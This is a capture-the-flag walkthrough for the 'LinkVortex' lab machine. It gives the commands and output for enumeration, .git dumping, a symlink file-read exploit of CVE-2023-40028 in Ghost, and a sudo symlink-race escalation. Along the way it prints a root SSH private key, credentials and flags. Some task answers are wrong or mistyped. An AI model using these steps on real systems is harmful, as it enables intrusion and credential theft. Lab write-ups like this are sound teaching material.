@@ -1,0 +1,430 @@
+ENUMERATION
+
+  nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn -sV 10.10.11.47
+  PORT   STATE SERVICE REASON  VERSION
+  22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+  80/tcp open  http    syn-ack Apache httpd
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+_____________________________________________________________
+|Task 1 How many open TCP ports are listening on LinkVortex?
+|  2 
+-------------------------------------------------------------
+Now we use this command to found the subdomain
+  nmap -sC -sV 10.10.11.47
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+  | ssh-hostkey: 
+  |   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
+  |_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
+  80/tcp open  http    Apache httpd
+  |_http-server-header: Apache
+  |_http-title: BitByBit Hardware
+  |_http-generator: Ghost 5.58
+  | http-robots.txt: 4 disallowed entries 
+  |_/ghost/ /p/ /email/ /r/
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Exploring the various blog posts doesn't reveal anything interesting except that the author seems
+to be admin@linkvortex.htb
+
+We use the tool ffuf to found the subdomain, we see that robots.txt give 4 but only the first (ghost) is enable
+with this command 
+  ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt -H "Host:FUZZ.linkvortex.htb" -u http://linkvortex.htb/ -ic -fs 230
+
+Can found the subdomain
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://linkvortex.htb/
+ :: Wordlist         : FUZZ: /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt
+ :: Header           : Host: FUZZ.linkvortex.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 230
+________________________________________________
+
+dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 101ms]
+:: Progress: [100000/100000] :: Job [1/1] :: 411 req/sec :: Duration: [0:04:15] :: Errors: 0 ::
+
+We see that is 'dev'
+-------------------------------------------------------------
+|Task 2 What subdomain of linkvortex.htb returns a differt application from the main site?
+|  dev.linkvortex.htb 
+-------------------------------------------------------------
+At first glance, it doesn't seem to have anything we can interact with, but let's enumerate further
+with ffuf , this time for directories.
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ -ic -t 20 
+
+* IMPORTANT if you dont have the file, you can install with sudo apt install seclists
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dev.linkvortex.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 20
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 100ms]
+.git/config             [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 100ms]
+.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 100ms]
+.git/logs/              [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 100ms]
+.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 99ms]
+.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 98ms]
+.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 98ms]
+.git/index              [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 100ms]
+cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 95ms]
+index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 96ms]
+server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 97ms]
+:: Progress: [4744/4744] :: Job [1/1] :: 104 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
+
+-------------------------------------------------------------
+|Task 3 What is the name of the directory that is exposed on the dev subdomain that allows access to the site's source code?
+| .git
+-------------------------------------------------------------
+
+******************************************************************************************************************************************
+
+ENUMERATION GIT 
+
+We can use a tool like gitdumper to dump the directory to our local machine and explore it
+further.
+
+I recomend that install in a virtual enviroment
+  pip install git-dumper
+
+Then you can use 'git-dumper  http://dev.linkvortex.htb gitdump'
+
+[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
+[-] Testing http://dev.linkvortex.htb/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
+[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
+[-] Fetching http://dev.linkvortex.htb/.git/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
+[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
+[-] Fetching http://dev.linkvortex.htb/.git/config [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/description [200]
+[-] Fetching http://dev.linkvortex.htb/.git/index [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
+[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
+[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
+[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
+[-] Sanitizing .git/config
+[-] Running git checkout .
+Updated 5596 paths from the index
+
+Now, we can navigate to the gitdump directory and check the git status.
+
+cd gitdump && git status
+Not currently on any branch.
+Changes to be committed:
+  (use "git restore --staged <file>..." to unstage)
+        new file:   Dockerfile.ghost
+        modified:   ghost/core/test/regression/api/admin/authentication.test.js
+
+We see changes have been made, and the specific file modified is authentication.test.js . To view it, let's restore the staged changes and see the differences.
+
+We used the command 
+  git restore --staged . && git diff 
+
+diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
+index 2735588..e654b0e 100644
+--- a/ghost/core/test/regression/api/admin/authentication.test.js
++++ b/ghost/core/test/regression/api/admin/authentication.test.js
+@@ -53,7 +53,7 @@ describe('Authentication API', function () {
+ 
+         it('complete setup', async function () {
+             const email = 'test@example.com';
+-            const password = 'thisissupersafe';
++            const password = 'OctopiFociPilfer45';
+ 
+             const requestMock = nock('https://api.github.com')
+                 .get('/repos/tryghost/dawn/zipball')
+
+_____________________________________________________________
+| Task 4 What is the bob user's password for the Ghost admin panel?
+|   OctopiFociPilfer45
+_____________________________________________________________
+
+Then we try to entry with the email admin@linkvortex.htb and password OctopiFociPilfer45
+When we entry we see the dashboard
+
+In the settings you can fin the version of the Ghost
+_____________________________________________________________
+| Task 5 What version of Ghost running on LinkVortex?
+|   OctopiFociPilfer45
+_____________________________________________________________
+
+Ghost version 5.58.0 is vulnerable to several exploits. One notable exploit is the Arbitrary File Read vulnerability (CVE-2023-40028)
+
+_____________________________________________________________
+| Task 6 What is the 2023 CVE ID for an authenticated file read vulnerability in this version of Ghost?
+|   CVE-2203-40028
+_____________________________________________________________
+
+******************************************************************************************************************************************
+
+Foothold
+
+Then make this 
+
+mkdir -p exploit/content/images/
+ln -s /etc/passwd exploit/content/images/test-file.png
+zip -r -y exploit.zip exploit/
+  adding: exploit/ (stored 0%)
+  adding: exploit/content/ (stored 0%)
+  adding: exploit/content/images/ (stored 0%)
+  adding: exploit/content/images/test-file.png (stored 0%)
+
+Now we can import the file in the part of labs
+
+We see that the file was accepted, so let's try to request the symlink file with cURL .
+
+curl http://linkvortex.htb/content/images/test-file.png
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/
+
+
+Then you need to clonne the repositorie 'https://github.com/0xyassine/CVE-2023-40028/tree/master'
+
+And modified the exploit whit nano or vim, changen the ip to the domain http://linkvortex.htb 
+Then execute the exploits
+*IMPORTANT if the .sh cant execute, use the comando chmod +x %filename%.sh 
+
+A quick Google search leads us to this possible file /var/lib/ghost/config.production.json .
+
+_____________________________________________________________
+| Task 7 What is the full path of the Ghost configuration file that contains an exposed password?
+|     /var/lib/ghost/config.production.json
+_____________________________________________________________
+
+
+./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
+WELCOME TO THE CVE-2023-40028 SHELL
+file> /var/lib/ghost/config.production.json
+{
+  "url": "http://localhost:2368",
+  "server": {
+    "port": 2368,
+    "host": "::"
+  },
+  "mail": {
+    "transport": "Direct"
+  },
+  "logging": {
+    "transports": ["stdout"]
+  },
+  "process": "systemd",
+  "paths": {
+    "contentPath": "/var/lib/ghost/content"
+  },
+  "spam": {
+    "user_login": {
+        "minWait": 1,
+        "maxWait": 604800000,
+        "freeRetries": 5000
+    }
+  },
+  "mail": {
+     "transport": "SMTP",
+     "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+        }
+      }
+    }
+}
+
+_____________________________________________________________
+| Task 8   What is the bob user's password on LinkVortex?
+|   fibber-talented-worth
+_____________________________________________________________
+
+We see that we have the user and the password we can connect with ssh
+
+ssh bob@linkvortex.htb                      
+The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
+ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
+bob@linkvortex.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
+bob@linkvortex:~$
+
+To the first flag you can find with 
+
+bob@linkvortex:~$ ls
+user.txt
+bob@linkvortex:~$ cat user.txt 
+3bda1102b2668f03c50b67499c741d81
+
+******************************************************************************************************************************************
+
+Privilege Escalation
+
+We use 'sudo -l' to check the permision that we have
+
+bob@linkvortex:~$ sudo -l
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
+    env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+
+_____________________________________________________________
+| Task 9 Which is the name of the script that bob execute as any user without providing a password?
+|   clean_symlink.sh 
+_____________________________________________________________
+
+Then we need to create a new exploit 
+mkdir -p exploit2/content/images/
+ln -s /ok exploit2/content/images/key.png
+zip -r -y exploit2.zip exploit2          
+  adding: exploit2/ (stored 0%)
+  adding: exploit2/content/ (stored 0%)
+  adding: exploit2/content/images/ (stored 0%)
+  adding: exploit2/content/images/key.png (stored 0%)
+
+Then we to execute this command to obtain the ssh key
+bob@linkvortex:~$ while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png;done
+
+_____________________________________________________________
+| Task 10 What is the full path of the SSH private key file for the root user?
+|   /root/.ssh/id_rsa
+_____________________________________________________________
+
+Then we open a new terminal with ssh with bob and execute the command to see the rsa 
+export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+Then you need to create a file with name root, and put the key in the file 
+Now execute the command 
+ssh -i root root@linkvortex.htb
+
+and only found the flag 
+root@linkvortex:~# ls
+root.txt
+root@linkvortex:~# cat root.txt 
+88bcaa9d760d3e29f979b246d5e1464f
